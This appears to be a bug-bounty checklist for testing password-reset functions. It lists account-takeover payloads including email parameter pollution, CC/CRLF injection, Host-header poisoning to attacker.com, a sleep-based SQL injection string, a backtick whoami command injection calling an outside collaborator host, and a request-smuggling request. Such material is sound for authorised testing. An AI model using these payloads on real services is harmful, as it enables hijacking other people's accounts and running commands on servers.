# Testing-forget-Password-

1. Host Header Injection - Password Reset Poisoning
2. HPP:
email=v@g.com&email=a@g.com
email[]=v@g.com&email[]=a@g.com
email=v@g.com%20email=a@g.com
email=v@g.com|email=a@g.com
email=v@g.com,a@g.com
email=v@g.com%20a@g.com
{"email":"v@g.com","email":"a@g.com"}
{"email":["v@g.com","a@g.com"]}
3. IDOR
4. Broken Crypto
5. Password reset token Leakage via referral header
6. Token leakage in response/JS files.
7. Session/Token is not expiring after password reset.
8. Add only space in password.
9. Ask for 2 password reset links and try the older one
10. SMTP Injection: v@g.com%0d%0aCC%3aa@g.com%0d%0a
11. Use paramminer to discover additional parameters(or append previously known parameters) in the request. Now try IDOR.
12. Try:
POST https://attacker(.)com/resetpassword.php HTTP/1.1
POST 
@attacker
.com/resetpassword.php HTTP/1.1
POST :
@attacker
.com/resetpassword.php HTTP/1.1
POST /resetpassword.php@attacker.com HTTP/1.1
13. SQLi: test@test.com'+(select*from(select(sleep(2)))a)+'
14. Append a .json after the endpoint.
15. CRLF: /resetpassword?%0d%0aHost:%20attacker(.)com
16. Register with a username identical to the victim's username, but with white spaces inserted before and/or after the username("tuhin1729 ", " tuhin1729 " etc). Try a password reset for your account. Use the token to reset victim's password. Ex: CVE-2020-7245
17. DoS
18. If they are sending an otp for password reset, try 2fa bypass techniques.
19. During registration, use homograph in email. Now try password reset.
20. Change the request method and content-type and observer how the application is responding.
22. Try XSS, SSTI etc in the email field.
23. Try Command injection by email=hello@`whoami`.xyz.burpcollaborator.net
24. 2FA auto disabled after password reset.
25. User Enumeration
26. Check whether any param value is reflecting in the email. Now try HTMLi.


Password Reset Token Leak Via Referrer
Request password reset to your email address
Click on the password reset link
Don’t change password
Click any 3rd party websites(eg: Facebook, twitter)
Intercept the request in Burp Suite proxy
Check if the referer header is leaking password reset token.
Account Takeover Through Password Reset Poisoning
Intercept the password reset request in Burp Suite
Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: attacker.com
Forward the request with the modified header
http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com
Look for a password reset URL based on the host header like : https://attacker.com/reset-password.php?token=TOKEN
Password Reset Via Email Parameter
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
IDOR on API Parameters
Attacker have to login with their account and go to the Change password feature.
Start the Burp Suite and Intercept the request
Send it to the repeater tab and edit the parameters : User ID/email
powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})
Weak Password Reset Token
The password reset token should be randomly generated and unique every time.
Try to determine if the token expire or if it’s always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.

Timestamp
UserID
Email of User
Firstname and Lastname
Date of Birth
Cryptography
Number only
Small token sequence ( characters between [A-Z,a-z,0-9])
Token reuse
Token expiration date
Leaking Password Reset Token
Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
Inspect the server response and check for resetToken
Then use the token in an URL like https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]
Password Reset Via Username Collision
Register on the system with a username identical to the victim’s username, but with white spaces inserted before and/or after the username. e.g: "admin "
Request a password reset with your malicious username.
Use the token sent to your email and reset the victim password.
Connect to the victim account with the new password.
The platform CTFd was vulnerable to this attack.
See: CVE-2020-7245

Account Takeover Via Cross Site Scripting
Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : *.domain.com
Leak the current sessions cookie
Authenticate as the user using the cookie
Account Takeover Via HTTP Request Smuggling
Refer to HTTP Request Smuggling vulnerability page.
1. Use smuggler to detect the type of HTTP Request Smuggling (CL, TE, CL.TE)
powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h
2. Craft a request which will overwrite the POST / HTTP/1.1 with the following data:
powershell GET http://something.burpcollaborator.net HTTP/1.1 X:
3. Final request could look like the following
“`powershell
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reports exploiting this bug
* https://hackerone.com/reports/737140
* https://hackerone.com/reports/771666

Account Takeover via CSRF
Create a payload for the CSRF, e.g: “HTML form with auto submit for a password change”
Send the payload
Account Takeover via JWT
JSON Web Token might be used to authenticate an user.

Edit the JWT with another User ID / Email
Check for weak JWT signature
